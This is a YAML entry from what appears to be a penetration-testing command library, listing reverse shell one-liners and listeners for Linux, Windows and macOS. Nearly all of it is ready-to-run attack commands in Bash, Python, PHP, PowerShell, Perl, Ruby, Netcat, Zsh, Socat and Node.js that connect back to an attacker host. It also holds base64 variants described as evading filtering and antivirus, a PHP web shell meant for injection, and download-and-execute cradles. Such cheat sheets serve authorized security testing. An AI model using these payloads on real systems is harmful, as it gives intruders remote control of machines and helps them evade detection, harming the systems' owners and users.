---
description: |
  Common reverse shell one-liners for Linux, Windows, and macOS — Bash, Python, PHP, PowerShell, Perl, Netcat, Ruby, Zsh, and more. Always start a listener first before executing the payload.
command: |
  # Listener (Run First on Attacker)
  # Basic netcat listener:
  nc -lvnp 4444

  # Listener with readline support (arrow keys, history):
  rlwrap nc -lvnp 4444

  # Metasploit multi/handler:
  msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.10.10.21; set LPORT 4444; run"

  # Bash Reverse Shell (Linux)
  # Standard bash:
  bash -i >& /dev/tcp/10.10.10.21/4444 0>&1

  # Bash with exec:
  bash -c 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1'

  # Bash base64 encoded (bypass filtering):
  echo 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1' | base64
  # Then on target:
  echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4yMS80NDQ0IDA+JjE= | base64 -d | bash

  # Python3 Reverse Shell
  # Python3 with /bin/bash:
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.21",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

  # Python3 with /bin/sh (more portable):
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.21",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

  # Python3 short version:
  python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.21",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

  # PHP Reverse Shell
  # PHP exec:
  php -r '$sock=fsockopen("10.10.10.21",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

  # PHP system (alternative):
  php -r '$sock=fsockopen("10.10.10.21",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

  # PHP web shell one-liner (upload or inject):
  <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1'"); ?>

  # PowerShell Reverse Shell (Windows)
  # Full PowerShell reverse shell:
  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.21',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

  # PowerShell base64 encoded (bypass AV/detection):
  # Generate on attacker:
  echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.21/shell.ps1")' | iconv -t UTF-16LE | base64 -w 0
  # Run on target:
  powershell -nop -enc <BASE64_STRING>

  # Perl Reverse Shell
  perl -e 'use Socket;$i="10.10.10.21";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'

  # Ruby Reverse Shell
  ruby -rsocket -e'f=TCPSocket.open("10.10.10.21",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'

  # Netcat Reverse Shells
  # Netcat with -e (traditional, requires ncat or netcat-traditional):
  nc -e /bin/bash 10.10.10.21 4444
  nc -e /bin/sh 10.10.10.21 4444

  # Netcat mkfifo (works with OpenBSD netcat, most common):
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.21 4444 >/tmp/f

  # Netcat with named pipe alternative:
  mknod /tmp/backpipe p && /bin/bash 0</tmp/backpipe | nc 10.10.10.21 4444 1>/tmp/backpipe

  # Zsh Reverse Shell (macOS)
  zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.10.21 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'

  # Curl Pipe Shell
  curl https://reverse-shell.sh/10.10.10.21:4444 | sh

  # Windows Netcat
  # nc.exe (upload first via file transfer):
  nc.exe 10.10.10.21 4444 -e cmd.exe
  nc.exe 10.10.10.21 4444 -e powershell.exe

  # Socat Reverse Shell
  # On attacker (listener):
  socat file:`tty`,raw,echo=0 tcp-listen:4444
  # On victim (Linux):
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.21:4444

  # Node.js Reverse Shell
  node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/bash",[]);var client=new net.Socket();client.connect(4444,"10.10.10.21",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
  - macOS
services: []
techniques: []
references:
  - https://www.revshells.com/
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
---
